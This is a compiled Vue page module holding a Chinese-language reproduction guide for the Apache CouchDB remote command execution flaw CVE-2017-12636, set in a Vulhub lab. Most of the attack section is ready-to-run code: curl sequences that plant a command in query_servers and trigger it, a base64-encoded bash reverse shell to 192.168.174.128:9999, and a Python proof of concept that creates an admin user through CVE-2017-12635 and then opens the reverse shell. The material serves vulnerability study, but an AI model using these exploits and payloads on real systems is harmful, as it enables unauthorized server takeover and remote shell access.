import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as u,a as n,b as s,d as e,e as p}from"./app-58e4a7d6.js";const c={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),d=n("p",null,'Apache CouchDB是一个开源数据库，专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。',-1),r=n("p",null,[s("在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置"),n("code",null,"query_server"),s("，这个配置项在设计、执行view的时候将被运行。")],-1),v=n("p",null,"参考链接：",-1),m={href:"http://bobao.360.cn/learning/detail/4716.html",target:"_blank",rel:"noopener noreferrer"},b={href:"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html",target:"_blank",rel:"noopener noreferrer"},h=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Couchdb 小于 1.7.0 以及 小于 2.1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Couchdb 2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是1.6.0版本，如果你想测试2.1.0版本，可以启动CVE-2017-12635附带的环境。</p><p>Vulhub执行如下命令启动Couchdb 1.6.0环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p><h3 id="_1-6-0-下的说明" tabindex="-1"><a class="header-anchor" href="#_1-6-0-下的说明" aria-hidden="true">#</a> 1.6.0 下的说明</h3><p>依次执行如下请求即可触发任意命令执行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest&#39;
curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;
curl -X POST &#39;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221049822.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p><p>查看<code>/tmp/success</code>文件内容：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221049362.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="_2-1-0-下的说明" tabindex="-1"><a class="header-anchor" href="#_2-1-0-下的说明" aria-hidden="true">#</a> 2.1.0 下的说明</h3><p>2.1.0中修改了上面用到的两个API，这里需要详细说明一下。</p><p>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问<code>/_membership</code>即可：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://vulhub:vulhub@your-ip:5984/_membership
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221014285.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，我们这里只有一个node，名字是<code>nonode@nohost</code>。</p><p>然后，我们修改<code>nonode@nohost</code>的配置：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221014315.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest&#39;
curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221018281.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Couchdb 2.x删除了<code>_temp_view</code>，所以我们为了触发<code>query_servers</code>中定义的命令，需要添加一个<code>_view</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39; -H &quot;Content-Type: application/json&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>增加<code>_view</code>的同时即触发了<code>query_servers</code>中的命令，<code>/tmp/success</code>文件夹被成功创建。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221020820.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="_1-6-0下反弹shell" tabindex="-1"><a class="header-anchor" href="#_1-6-0下反弹shell" aria-hidden="true">#</a> 1.6.0下反弹shell</h3><p>curl 调用字符串需要用 <code>&#39;</code>或<code>&quot;</code>；json 需要 <code>&quot;</code>，bash -c 的字符串需要 <code>&#39;</code>或<code>&quot;</code>，因此可以将反弹 shell 的语句写在文本shell.txt里面，然后通过 curl 调用shell.txt。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ vim shell.txt
文件内容：&quot;bash -c &#39;{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzQuMTI4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&#39;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>依次执行如下请求即可触发反弹shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 第一步：-d参数读取本地文本文件的数据，向服务器发送
curl -X PUT &#39;http://vulhub:vulhub@192.168.174.128:5984/_config/query_servers/cmd&#39; -d &#39;@shell.txt&#39;

# 第二步：添加Database
curl -X PUT &#39;http://vulhub:vulhub@192.168.174.128:5984/vultest&#39;

# 第三步：添加Document
curl -X PUT &#39;http://vulhub:vulhub@192.168.174.128:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;

# 进行查询，将language设置为cmd，这里就会用到第一步里添加的名为cmd的query_servers，最后触发命令执行
curl -X POST &#39;http://vulhub:vulhub@192.168.174.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><p>1.6.0或2.1.0下反弹shell的poc</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>auth <span class="token keyword">import</span> HTTPBasicAuth

target <span class="token operator">=</span> <span class="token string">&#39;http://192.168.174.128:5984&#39;</span>
command <span class="token operator">=</span> <span class="token triple-quoted-string string">rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot;&quot;&quot;</span>

<span class="token comment"># Change Version Here</span>
version <span class="token operator">=</span> <span class="token number">2</span>

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span>
<span class="token punctuation">}</span>
<span class="token comment"># session.proxies = {</span>
<span class="token comment">#     &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;</span>
<span class="token comment"># }</span>
session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/_users/org.couchdb.user:wooyun&#39;</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token triple-quoted-string string">&#39;&#39;&#39;{
  &quot;type&quot;: &quot;user&quot;,
  &quot;name&quot;: &quot;wooyun&quot;,
  &quot;roles&quot;: [&quot;_admin&quot;],
  &quot;roles&quot;: [],
  &quot;password&quot;: &quot;wooyun&quot;
}&#39;&#39;&#39;</span><span class="token punctuation">)</span>

session<span class="token punctuation">.</span>auth <span class="token operator">=</span> HTTPBasicAuth<span class="token punctuation">(</span><span class="token string">&#39;wooyun&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;wooyun&#39;</span><span class="token punctuation">)</span>

command <span class="token operator">=</span> <span class="token string">&quot;bash -c &#39;{echo,%s}|{base64,-d}|{bash,-i}&#39;&quot;</span> <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> version <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">&#39;/_config/query_servers/cmd&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    host <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/_membership&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;all_nodes&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/_node/{}/_config/query_servers/cmd&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>

session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/wooyun&#39;</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/wooyun/test&#39;</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">&#39;{&quot;_id&quot;: &quot;wooyuntest&quot;}&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> version <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/wooyun/_temp_view?limit=10&#39;</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">&#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">&#39;/wooyun/_design/test&#39;</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">&#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功反弹shell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221040431.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,45);function k(g,q){const a=o("ExternalLinkIcon");return i(),u("div",null,[l,d,r,v,n("ul",null,[n("li",null,[n("a",m,[s("http://bobao.360.cn/learning/detail/4716.html"),e(a)])]),n("li",null,[n("a",b,[s("https://justi.cz/security/2017/11/14/couchdb-rce-npm.html"),e(a)])])]),h])}const y=t(c,[["render",k],["__file","Apache CouchDB 任意命令执行漏洞 CVE-2017-12636.html.vue"]]);export{y as default};
